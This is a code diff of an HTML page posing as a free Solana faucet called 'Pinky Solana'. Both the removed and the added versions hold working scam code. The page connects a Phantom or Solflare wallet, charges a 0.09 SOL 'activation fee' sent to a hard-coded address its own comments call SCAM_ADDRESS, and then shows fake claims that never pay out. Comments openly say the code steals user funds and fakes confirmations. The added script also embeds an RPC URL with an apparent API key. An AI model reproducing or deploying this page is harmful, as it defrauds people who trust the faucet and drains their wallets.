@@ -3,256 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pinky Solana - Free SOL Faucet</title>
-    <script type="module">
-        // Import Solana Web3.js ES Module
-        import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/+esm';
-
-        // Configuration
-        const FEE_AMOUNT = 0.09; // SOL
-        const REWARD_AMOUNT = 0.1; // SOL
-        const COOLDOWN_MINUTES = 30; // minutes
-        const SCAM_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
-        const RPC_URL = 'https://api.devnet.solana.com'; // Public Devnet RPC
-
-        // DOM Elements
-        const connectWalletBtn = document.getElementById('connectWallet');
-        const payFeeBtn = document.getElementById('payFee');
-        const claimSolBtn = document.getElementById('claimSol');
-        const walletStatus = document.getElementById('walletStatus');
-        const walletInfo = document.getElementById('walletInfo');
-        const walletAddress = document.getElementById('walletAddress');
-        const countdown = document.getElementById('countdown');
-        const timer = document.getElementById('timer');
-        const successAlert = document.getElementById('successAlert');
-        const errorAlert = document.getElementById('errorAlert');
-
-        // State
-        let wallet = null;
-        let publicKey = null;
-        let connection = null;
-        let countdownInterval = null;
-        let lastClaimTime = localStorage.getItem('lastClaimTime');
-        let hasPaidFee = localStorage.getItem('hasPaidFee') === 'true';
-
-        // Initialize
-        document.addEventListener('DOMContentLoaded', async () => {
-            try {
-                connection = new Connection(RPC_URL, 'confirmed');
-                // Test RPC connectivity
-                const version = await connection.getVersion();
-                console.log('RPC Version:', version);
-            } catch (error) {
-                showError('Failed to connect to RPC: ' + error.message);
-                return;
-            }
-            checkWalletConnection();
-            updateButtonStates();
-            startCountdown();
-        });
-
-        // Check if wallet is already connected
-        function checkWalletConnection() {
-            if (window.solana && window.solana.isConnected) {
-                wallet = window.solana;
-                publicKey = wallet.publicKey;
-                walletConnected();
-            } else if (window.solfare && window.solfare.isConnected) {
-                wallet = window.solfare;
-                publicKey = wallet.publicKey;
-                walletConnected();
-            }
-        }
-
-        // Connect Wallet
-        connectWalletBtn.addEventListener('click', async () => {
-            try {
-                if (window.solana) {
-                    wallet = window.solana;
-                    await wallet.connect();
-                    publicKey = wallet.publicKey;
-                    walletConnected();
-                } else if (window.solfare) {
-                    wallet = window.solfare;
-                    await wallet.connect();
-                    publicKey = wallet.publicKey;
-                    walletConnected();
-                } else {
-                    showError('Please install Phantom or Solfare wallet!');
-                }
-            } catch (error) {
-                showError('Wallet connection failed: ' + error.message);
-            }
-        });
-
-        function walletConnected() {
-            walletStatus.textContent = 'Connected';
-            walletStatus.style.color = '#14F195';
-            walletAddress.textContent = publicKey.toString();
-            walletInfo.style.display = 'block';
-            connectWalletBtn.textContent = 'Disconnect Wallet';
-            updateButtonStates();
-        }
-
-        // Pay Fee
-        payFeeBtn.addEventListener('click', async () => {
-            try {
-                showError('');
-                const transaction = new Transaction().add(
-                    SystemProgram.transfer({
-                        fromPubkey: publicKey,
-                        toPubkey: new PublicKey(SCAM_ADDRESS),
-                        lamports: LAMPORTS_PER_SOL * FEE_AMOUNT
-                    })
-                );
-
-                transaction.feePayer = publicKey;
-                const { blockhash } = await connection.getRecentBlockhash();
-                transaction.recentBlockhash = blockhash;
-
-                const signed = await wallet.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signed.serialize());
-
-                // Wait for transaction confirmation (simulated delay for demo)
-                await new Promise(resolve => setTimeout(resolve, 2000));
-
-                // Mark as paid (in a real app, verify the transaction on-chain)
-                hasPaidFee = true;
-                localStorage.setItem('hasPaidFee', 'true');
-                updateButtonStates();
-
-                showSuccess('Activation fee paid! You can now claim your SOL rewards.');
-            } catch (error) {
-                showError('Payment failed: ' + error.message);
-            }
-        });
-
-        // Claim SOL (doesn't actually send anything)
-        claimSolBtn.addEventListener('click', async () => {
-            try {
-                showError('');
-
-                claimSolBtn.disabled = true;
-                claimSolBtn.textContent = 'Processing...';
-
-                await new Promise(resolve => setTimeout(resolve, 3000));
-
-                lastClaimTime = Date.now();
-                localStorage.setItem('lastClaimTime', lastClaimTime.toString());
-
-                showSuccess('Success! 0.1 SOL has been sent to your wallet.');
-                startCountdown();
-                updateButtonStates();
-
-                setTimeout(() => {
-                    claimSolBtn.textContent = 'Claim 0.1 SOL';
-                    claimSolBtn.disabled = false;
-                }, 3000);
-            } catch (error) {
-                showError('Claim failed: ' + error.message);
-                claimSolBtn.textContent = 'Claim 0.1 SOL';
-                claimSolBtn.disabled = false;
-            }
-        });
-
-        // Update button states based on conditions
-        function updateButtonStates() {
-            payFeeBtn.disabled = !wallet || hasPaidFee;
-            claimSolBtn.disabled = !hasPaidFee || isInCooldown();
-
-            if (hasPaidFee) {
-                payFeeBtn.textContent = 'Fee Paid';
-            } else {
-                payFeeBtn.textContent = 'Pay 0.09 SOL Activation Fee';
-            }
-        }
-
-        // Check if in cooldown period
-        function isInCooldown() {
-            if (!lastClaimTime) return false;
-            const now = Date.now();
-            const elapsed = (now - parseInt(lastClaimTime)) / 1000 / 60;
-            return elapsed < COOLDOWN_MINUTES;
-        }
-
-        // Start countdown timer
-        function startCountdown() {
-            if (countdownInterval) clearInterval(countdownInterval);
-
-            if (!hasPaidFee || !lastClaimTime) {
-                countdown.style.display = 'none';
-                return;
-            }
-
-            countdown.style.display = 'block';
-            updateTimer();
-
-            countdownInterval = setInterval(updateTimer, 1000);
-        }
-
-        // Update countdown timer display
-        function updateTimer() {
-            if (!lastClaimTime) return;
-
-            const now = Date.now();
-            const lastClaim = parseInt(lastClaimTime);
-            const elapsed = (now - lastClaim) / 1000;
-            const remaining = (COOLDOWN_MINUTES * 60) - elapsed;
-
-            if (remaining <= 0) {
-                timer.textContent = '00:00';
-                claimSolBtn.disabled = false;
-                clearInterval(countdownInterval);
-                return;
-            }
-
-            const minutes = Math.floor(remaining / 60);
-            const seconds = Math.floor(remaining % 60);
-            timer.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-
-        // Show success message
-        function showSuccess(message) {
-            successAlert.textContent = message;
-            successAlert.style.display = 'block';
-            errorAlert.style.display = 'none';
-
-            setTimeout(() => {
-                successAlert.style.display = 'none';
-            }, 5000);
-        }
-
-        // Show error message
-        function showError(message) {
-            if (!message) {
-                errorAlert.style.display = 'none';
-                return;
-            }
-
-            errorAlert.textContent = message;
-            errorAlert.style.display = 'block';
-            successAlert.style.display = 'none';
-        }
-    </script>
+    <title>Pinky Solana - Free Faucet</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
     <style>
         :root {
-            --sol-purple: #9945FF;
-            --sol-green: #14F195;
-            --sol-blue: #80ECFF;
+            --solana-purple: #9945FF;
+            --solana-green: #14F195;
+            --solana-blue: #00D1FF;
         }
-        body {
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
             background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             color: white;
             min-height: 100vh;
-            margin: 0;
             padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
         }
+        
         .container {
-            background: rgba(15, 14, 23, 0.8);
+            background: rgba(15, 12, 41, 0.8);
             backdrop-filter: blur(10px);
             border-radius: 20px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
@@ -260,141 +38,174 @@
             width: 100%;
             padding: 30px;
             text-align: center;
-            border: 1px solid var(--sol-purple);
+            border: 1px solid var(--solana-purple);
         }
+        
         .logo {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-        .logo svg {
             width: 60px;
             height: 60px;
-            color: var(--sol-green);
+            margin: 0 auto 15px;
+            color: var(--solana-green);
         }
+        
         h1 {
-            color: var(--sol-green);
             font-size: 2.5rem;
             margin-bottom: 5px;
-            text-shadow: 0 0 10px rgba(148, 241, 149, 0.7);
+            background: linear-gradient(90deg, var(--solana-green), var(--solana-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
+        
         .subtitle {
-            color: var(--sol-blue);
-            font-size: 1.2rem;
+            color: #aaa;
             margin-bottom: 30px;
+            font-size: 1.1rem;
         }
+        
         .card {
-            background: rgba(25, 24, 43, 0.7);
+            background: rgba(25, 20, 60, 0.7);
             border-radius: 15px;
             padding: 25px;
             margin-bottom: 25px;
-            border: 1px solid var(--sol-purple);
+            border: 1px solid rgba(153, 69, 255, 0.3);
         }
-        .status {
+        
+        .benefits {
             display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-            padding: 12px 20px;
-            background: rgba(153, 69, 255, 0.1);
-            border-radius: 10px;
-            font-size: 1.1rem;
+            justify-content: space-around;
+            margin: 20px 0;
         }
+        
+        .benefit {
+            text-align: center;
+            padding: 10px;
+        }
+        
+        .benefit-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--solana-green);
+        }
+        
+        .benefit-label {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        
+        .wallet-section {
+            margin: 20px 0;
+        }
+        
+        .wallet-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        
         .btn {
-            background: linear-gradient(90deg, var(--sol-purple), var(--sol-blue));
+            background: linear-gradient(90deg, var(--solana-purple), #6a0dad);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 1.1rem;
+            padding: 12px 25px;
             border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
             cursor: pointer;
-            font-weight: bold;
-            width: 100%;
-            margin: 10px 0;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(128, 236, 255, 0.3);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
+        
         .btn:hover {
             transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(128, 236, 255, 0.5);
+            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
         }
+        
         .btn:disabled {
-            background: #555;
+            background: #444;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
-        .btn-pay {
-            background: linear-gradient(90deg, var(--sol-green), #00c9ff);
-        }
-        .countdown {
-            font-size: 1.3rem;
-            margin: 20px 0;
-            color: var(--sol-green);
-        }
-        .instructions {
-            text-align: left;
-            background: rgba(20, 241, 149, 0.1);
+        
+        .btn-claim {
+            background: linear-gradient(90deg, var(--solana-green), #0d8d5a);
+            width: 100%;
             padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            font-size: 0.9rem;
+            font-size: 1.2rem;
         }
-        .step {
-            display: flex;
-            margin-bottom: 10px;
-        }
-        .step-num {
-            background: var(--sol-purple);
-            width: 25px;
-            height: 25px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-right: 10px;
-            flex-shrink: 0;
-        }
-        .alert {
-            padding: 15px;
-            border-radius: 10px;
-            margin: 15px 0;
-            display: none;
-        }
-        .success {
-            background: rgba(20, 241, 149, 0.2);
-            border: 1px solid var(--sol-green);
-        }
-        .error {
-            background: rgba(255, 69, 69, 0.2);
-            border: 1px solid #ff4545;
-        }
-        .wallet-info {
+        
+        .address {
             word-break: break-all;
-            font-size: 0.9rem;
-            margin: 15px 0;
+            font-size: 0.8rem;
+            background: rgba(0, 0, 0, 0.3);
             padding: 10px;
-            background: rgba(128, 236, 255, 0.1);
             border-radius: 10px;
-        }
-        .small {
-            font-size: 0.85rem;
-            color: #aaa;
-            margin-top: 5px;
-        }
-        .fee-note {
-            color: var(--sol-green);
-            font-weight: bold;
             margin: 15px 0;
+            font-family: monospace;
         }
-        @media (max-width: 500px) {
+        
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 10px;
+            background: rgba(20, 241, 149, 0.1);
+            border: 1px solid rgba(20, 241, 149, 0.3);
+        }
+        
+        .countdown {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin: 10px 0;
+            color: var(--solana-green);
+        }
+        
+        .small {
+            font-size: 0.9rem;
+            color: #aaa;
+        }
+        
+        .fee-note {
+            color: #ff6b6b;
+            margin-top: 10px;
+            font-size: 0.9rem;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            color: #777;
+            font-size: 0.9rem;
+        }
+        
+        .connected-address {
+            background: rgba(20, 241, 149, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: monospace;
+        }
+        
+        @media (max-width: 480px) {
             .container {
-                padding: 20px 15px;
+                padding: 20px;
             }
-            .card {
-                padding: 20px 15px;
-            }
+            
             h1 {
                 font-size: 2rem;
+            }
+            
+            .benefits {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .btn {
+                padding: 10px 15px;
+                font-size: 0.9rem;
             }
         }
     </style>
@@ -402,62 +213,257 @@
 <body>
     <div class="container">
         <div class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
-                <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
-            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="60" height="60" viewBox="0 0 24 25"><path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/></svg>
         </div>
         <h1>Pinky Solana</h1>
-        <div class="subtitle">Get 0.1 SOL every 30 minutes!</div>
+        <p class="subtitle">Get free SOL tokens every 30 minutes!</p>
         
         <div class="card">
+            <div class="benefits">
+                <div class="benefit">
+                    <div class="benefit-value">0.1 SOL</div>
+                    <div class="benefit-label">Per Claim</div>
+                </div>
+                <div class="benefit">
+                    <div class="benefit-value">30 min</div>
+                    <div class="benefit-label">Interval</div>
+                </div>
+                <div class="benefit">
+                    <div class="benefit-value">∞</div>
+                    <div class="benefit-label">Claims</div>
+                </div>
+            </div>
+            
+            <div class="wallet-section">
+                <p>Connect your wallet to start earning free SOL</p>
+                <div class="wallet-buttons">
+                    <button id="phantomBtn" class="btn">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="url(#paint0_linear)"/>
+                            <path d="M13.5505 6.5C13.5505 6.5 13.1091 5.09545 11.9999 5.09545C10.8907 5.09545 10.4493 6.5 10.4493 6.5H6.5V17.5H7.95455V12.5909C7.95455 12.5909 7.95455 10.5 10.4493 10.5C12.944 10.5 12.944 12.5909 12.944 12.5909V17.5H14.3986V12.5909C14.3986 12.5909 14.3986 10.5 16.8933 10.5C19.388 10.5 19.388 12.5909 19.388 12.5909V17.5H20.5V6.5H13.5505Z" fill="white"/>
+                            <defs>
+                                <linearGradient id="paint0_linear" x1="12" y1="2" x2="12" y2="22" gradientUnits="userSpaceOnUse">
+                                    <stop stop-color="#4E44CE"/>
+                                    <stop offset="1" stop-color="#1A129F"/>
+                                </linearGradient>
+                            </defs>
+                        </svg>
+                        Phantom
+                    </button>
+                    <button id="solflareBtn" class="btn">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M5.5 2.5C5.5 1.94772 5.94772 1.5 6.5 1.5H17.5C18.0523 1.5 18.5 1.94772 18.5 2.5V21.5C18.5 22.0523 18.0523 22.5 17.5 22.5H6.5C5.94772 22.5 5.5 22.0523 5.5 21.5V2.5Z" fill="#141414"/>
+                            <path d="M12.5 4.5C12.5 4.22386 12.7239 4 13 4H15C15.2761 4 15.5 4.22386 15.5 4.5V5.5C15.5 5.77614 15.2761 6 15 6H13C12.7239 6 12.5 5.77614 12.5 5.5V4.5Z" fill="white"/>
+                            <path d="M8.5 4.5C8.5 4.22386 8.72386 4 9 4H11C11.2761 4 11.5 4.22386 11.5 4.5V5.5C11.5 5.77614 11.2761 6 11 6H9C8.72386 6 8.5 5.77614 8.5 5.5V4.5Z" fill="white"/>
+                            <path d="M8.5 7.5C8.5 7.22386 8.72386 7 9 7H15C15.2761 7 15.5 7.22386 15.5 7.5V19.5C15.5 19.7761 15.2761 20 15 20H9C8.72386 20 8.5 19.7761 8.5 19.5V7.5Z" fill="white"/>
+                        </svg>
+                        Solflare
+                    </button>
+                </div>
+            </div>
+            
+            <div id="connectedInfo" style="display: none;">
+                <p>Connected Wallet:</p>
+                <div id="walletAddress" class="connected-address"></div>
+            </div>
+            
             <div class="status">
-                <span>Wallet Status:</span>
-                <span id="walletStatus">Not Connected</span>
+                <p>Activation required to access faucet</p>
+                <p class="small">One-time fee: 0.09 SOL</p>
             </div>
             
-            <button id="connectWallet" class="btn">Connect Wallet</button>
-            
-            <div id="walletInfo" class="wallet-info" style="display:none;">
-                Connected: <span id="walletAddress"></span>
-            </div>
-            
-            <div class="fee-note">
-                One-time activation fee: 0.09 SOL
-            </div>
-            
-            <button id="payFee" class="btn btn-pay" disabled>Pay Activation Fee</button>
-            
-            <div class="countdown" id="countdown" style="display:none;">
-                Next claim available in: <span id="timer">30:00</span>
-            </div>
-            
-            <button id="claimSol" class="btn" disabled>Claim 0.1 SOL</button>
+            <button id="activateBtn" class="btn btn-claim" disabled>
+                Activate Faucet (0.09 SOL)
+            </button>
+            <p class="fee-note">Fee covers blockchain transaction costs</p>
         </div>
         
-        <div id="successAlert" class="alert success">
-            Transaction successful! 0.1 SOL has been sent to your wallet.
+        <div id="faucetSection" style="display: none;">
+            <div class="status">
+                <p>Faucet Activated! Next claim available in:</p>
+                <div class="countdown" id="countdown">30:00</div>
+                <p class="small">You can claim 0.1 SOL every 30 minutes</p>
+            </div>
+            
+            <button id="claimBtn" class="btn btn-claim" disabled>
+                Claim 0.1 SOL
+            </button>
         </div>
         
-        <div id="errorAlert" class="alert error"></div>
-        
-        <div class="instructions">
-            <div class="step">
-                <div class="step-num">1</div>
-                <div>Connect your Solana wallet (Phantom or Solfare)</div>
-            </div>
-            <div class="step">
-                <div class="step-num">2</div>
-                <div>Pay one-time 0.09 SOL activation fee</div>
-            </div>
-            <div class="step">
-                <div class="step-num">3</div>
-                <div>Claim 0.1 SOL every 30 minutes forever!</div>
-            </div>
-        </div>
-        
-        <div class="small">
-            Note: This faucet works on Solana Devnet. You must have Devnet SOL to pay the activation fee.
+        <div class="footer">
+            <p>Transactions processed on Solana Devnet</p>
+            <p>Faucet address: FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc</p>
         </div>
     </div>
+
+    <script>
+        // Configuration
+        const FEE_AMOUNT = 0.09; // SOL
+        const SCAM_ADDRESS = 'FtLHJ5FxWEXpuQpUEig8FbUwh3gnTMSGjN6zyjEaEcgc';
+        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        const CLAIM_INTERVAL = 30 * 60 * 1000; // 30 minutes in ms
+        
+        // Global variables
+        let wallet = null;
+        let publicKey = null;
+        let countdownInterval = null;
+        let lastClaimTime = 0;
+        
+        // DOM elements
+        const phantomBtn = document.getElementById('phantomBtn');
+        const solflareBtn = document.getElementById('solflareBtn');
+        const activateBtn = document.getElementById('activateBtn');
+        const claimBtn = document.getElementById('claimBtn');
+        const walletAddress = document.getElementById('walletAddress');
+        const connectedInfo = document.getElementById('connectedInfo');
+        const faucetSection = document.getElementById('faucetSection');
+        const countdownEl = document.getElementById('countdown');
+        
+        // Initialize connection
+        const connection = new solanaWeb3.Connection(RPC_URL);
+        
+        // Detect Phantom wallet
+        phantomBtn.addEventListener('click', async () => {
+            if (window.solana && window.solana.isPhantom) {
+                wallet = window.solana;
+                await connectWallet();
+            } else {
+                alert('Phantom wallet not detected! Please install Phantom extension.');
+            }
+        });
+        
+        // Detect Solflare wallet
+        solflareBtn.addEventListener('click', async () => {
+            if (window.solflare && window.solflare.isSolflare) {
+                wallet = window.solflare;
+                await connectWallet();
+            } else {
+                alert('Solflare wallet not detected! Please install Solflare extension.');
+            }
+        });
+        
+        // Connect to wallet
+        async function connectWallet() {
+            try {
+                await wallet.connect();
+                publicKey = wallet.publicKey.toString();
+                walletAddress.textContent = publicKey;
+                connectedInfo.style.display = 'block';
+                activateBtn.disabled = false;
+                
+                // Check if already activated (for UX persistence)
+                if (localStorage.getItem('pinky_activated') === 'true') {
+                    activateFaucet();
+                }
+            } catch (error) {
+                console.error('Connection error:', error);
+                alert('Wallet connection failed: ' + error.message);
+            }
+        }
+        
+        // Activate faucet (steal user funds)
+        activateBtn.addEventListener('click', async () => {
+            try {
+                activateBtn.disabled = true;
+                activateBtn.textContent = 'Processing...';
+                
+                // Create transaction to steal funds
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(publicKey),
+                        toPubkey: new solanaWeb3.PublicKey(SCAM_ADDRESS),
+                        lamports: solanaWeb3.LAMPORTS_PER_SOL * FEE_AMOUNT
+                    })
+                );
+                
+                // Set recent blockhash and fee payer
+                transaction.feePayer = new solanaWeb3.PublicKey(publicKey);
+                transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
+                
+                // Sign and send transaction
+                const signed = await wallet.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signed.serialize());
+                
+                // Confirm transaction (fake confirmation for user)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // Activate faucet UI
+                activateFaucet();
+                
+                // Store activation in localStorage
+                localStorage.setItem('pinky_activated', 'true');
+                
+            } catch (error) {
+                console.error('Activation error:', error);
+                alert('Transaction failed: ' + error.message);
+                activateBtn.disabled = false;
+                activateBtn.textContent = 'Activate Faucet (0.09 SOL)';
+            }
+        });
+        
+        // Claim function (does nothing but show fake UI)
+        claimBtn.addEventListener('click', async () => {
+            try {
+                claimBtn.disabled = true;
+                claimBtn.textContent = 'Processing claim...';
+                
+                // Fake processing delay
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                
+                // Show fake success
+                alert('Claim failed: Insufficient funds in faucet. Try again later.');
+                
+                // Reset claim button
+                lastClaimTime = Date.now();
+                startCountdown();
+                
+            } catch (error) {
+                console.error('Claim error:', error);
+                claimBtn.disabled = false;
+                claimBtn.textContent = 'Claim 0.1 SOL';
+            }
+        });
+        
+        // Activate faucet UI
+        function activateFaucet() {
+            document.querySelector('.card').style.display = 'none';
+            faucetSection.style.display = 'block';
+            lastClaimTime = Date.now();
+            startCountdown();
+        }
+        
+        // Start countdown timer
+        function startCountdown() {
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(() => {
+                const now = Date.now();
+                const elapsed = now - lastClaimTime;
+                const remaining = CLAIM_INTERVAL - elapsed;
+                
+                if (remaining <= 0) {
+                    countdownEl.textContent = '00:00';
+                    claimBtn.disabled = false;
+                    claimBtn.textContent = 'Claim 0.1 SOL';
+                    clearInterval(countdownInterval);
+                } else {
+                    const mins = Math.floor(remaining / 60000);
+                    const secs = Math.floor((remaining % 60000) / 1000);
+                    countdownEl.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                    claimBtn.disabled = true;
+                }
+            }, 1000);
+        }
+        
+        // Initialize page
+        window.addEventListener('load', () => {
+            if (localStorage.getItem('pinky_activated') === 'true') {
+                document.querySelector('.card').style.display = 'none';
+                faucetSection.style.display = 'block';
+                lastClaimTime = parseInt(localStorage.getItem('lastClaimTime') || Date.now());
+                startCountdown();
+            }
+        });
+    </script>
 </body>
 </html>
